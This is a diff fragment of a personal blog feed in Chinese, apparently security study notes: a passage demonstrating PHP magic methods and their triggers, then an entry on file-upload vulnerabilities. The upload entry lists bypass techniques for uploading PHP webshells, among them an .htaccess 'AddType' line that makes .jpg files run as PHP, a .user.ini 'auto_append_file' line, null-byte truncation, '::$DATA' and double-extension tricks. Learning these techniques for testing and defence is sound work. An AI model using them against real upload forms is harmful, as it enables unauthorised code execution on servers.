class="hljs-variable">$args</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example7</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__invoke 方法被调用，参数：<span class="hljs-subst">$arg1</span>, <span class="hljs-subst">$arg2</span>\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example1</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example2</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example3</span>();<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example4</span>();<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example5</span>();<br><span class="hljs-variable">$f</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example6</span>();<br><span class="hljs-variable">$g</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example7</span>();<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));                     <span class="hljs-comment">//  _wakeup触发条件:unserialize</span><br><span class="hljs-title function_ invoke__">strlen</span>( <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>)));            <span class="hljs-comment">// _tostring触发条件:ehco,print,与字符串作比较,strlen,addslashes等与字符串有关的函数</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>));                     <span class="hljs-comment">//_destruct触发条件:实例化，unset，若未被销毁，最后终会触发一次</span><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>-&gt;data;                                  <span class="hljs-comment">//_get触发方法:读取不可访问(不存在也算不可访问)的属性</span><br><span class="hljs-variable">$d</span>-&gt;data=<span class="hljs-number">123</span>;                                   <span class="hljs-comment">//_set触发方法：修改不可访问(不存在也算不可访问)的属性</span><br><span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">i</span>();                                        <span class="hljs-comment">//_call触发方法：调用不存在的方法,主要是方法，所以带括号，参数可有可无</span><br><span class="hljs-title class_">Example6</span>::<span class="hljs-title function_ invoke__">i</span>();                                  <span class="hljs-comment">//_callstatic触发方法：静态调用不存在的方法，而不是实例化调用</span><br><span class="hljs-variable">$g</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);                           <span class="hljs-comment">// _invoke触发条件: 对象被当作函数调用，且参数数量多于</span><br>                                                <span class="hljs-comment">//_isset触发条件:对不可访问的属性使用isset()或者empty()函数</span><br>                                                <span class="hljs-comment">//_unset触发条件:对不可访问的属性使用unset()</span><br>                                                <span class="hljs-comment">//_clone触发条件：使用clone函数</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;  _wakeup触发条件:unserialize<br>&#x2F;&#x2F;  _tostring触发条件:ehco,print,与字符串作比较,strlen,addslashes等与字符串有关的函数<br>&#x2F;&#x2F;_destruct触发条件:实例化，unset，若未被销毁，最后终会触发一次</p><p>&#x2F;&#x2F;_get触发方法:读取不可访问(不存在也算不可访问)的属性<br>&#x2F;&#x2F;_set触发方法：修改不可访问(不存在也算不可访问)的属性<br>&#x2F;&#x2F;_call触发方法：调用不存在的方法,主要是方法，所以带括号，参数可有可无<br>&#x2F;&#x2F;_callstatic触发方法：静态调用不存在的方法，而不是实例化调用<br>&#x2F;&#x2F; _invoke触发条件：对象被当作函数调用，且参数数量多于<br>&#x2F;&#x2F;_isset触发条件:对不可访问的属性使用isset()或者empty()函数<br>&#x2F;&#x2F;_unset触发条件:对不可访问的属性使用unset()函数<br>&#x2F;&#x2F;_clone触发条件：使用clone函数</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>web</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>文件上传漏洞</title>
+    <link href="/2025/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2025/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传漏洞是指服务器对用户上传的文件类型或内容未严格限制，导致攻击者可上传恶意文件（如木马、脚本），从而在服务器上执行恶意代码的漏洞。</p><h1 id="1-js检查"><a href="#1-js检查" class="headerlink" title="1.js检查:"></a>1.js检查:</h1><p>先是后缀为.jpg，然后利用bp抓包，将后缀改成.php</p><h1 id="2-可解析后缀"><a href="#2-可解析后缀" class="headerlink" title="2.可解析后缀:"></a>2.可解析后缀:</h1><p>如php3 php2等</p><h1 id="3-上传-htaccess和-user-ini文件"><a href="#3-上传-htaccess和-user-ini文件" class="headerlink" title="3.上传.htaccess和.user.ini文件:"></a>3.上传.htaccess和.user.ini文件:</h1><p>就是在Apache服务器中加入特殊脚本，将特定后缀名当做php解析,再上传jpg文件即可</p><p> <code>AddType application/x-httpd-php .jpg</code></p><p>上传完配置文件要访问&#x2F;upload&#x2F;1.png激活木马</p><p>.user.ini</p><p><code>auto_append_file=1.txt</code></p><h1 id="4-大小写绕过"><a href="#4-大小写绕过" class="headerlink" title="4.大小写绕过"></a>4.大小写绕过</h1><h1 id="5-DATA绕过"><a href="#5-DATA绕过" class="headerlink" title="5.::$DATA绕过:"></a>5.::$DATA绕过:</h1><p>利用bp，在php后面加::$DATA</p><p>仅仅windows可以</p><h1 id="6-双写绕过"><a href="#6-双写绕过" class="headerlink" title="6.双写绕过:"></a>6.双写绕过:</h1><p> .pphphp 自动识别第一个php使之为空(后端黑名单删后缀)</p><h1 id="7-0x00绕过"><a href="#7-0x00绕过" class="headerlink" title="7.0x00绕过:"></a>7.0x00绕过:</h1><p>利用bp，修改上传路径包含.php然后加上0x00，使后面的内容无效</p><h1 id="8-黑名单绕过"><a href="#8-黑名单绕过" class="headerlink" title="8.黑名单绕过:"></a>8.黑名单绕过:</h1><p>后缀名后加空格或特殊字符.</p><p>若为一次校验，则在php后使用. <strong>.空格</strong>绕过</p>]]></content>
     
     
     <categories>
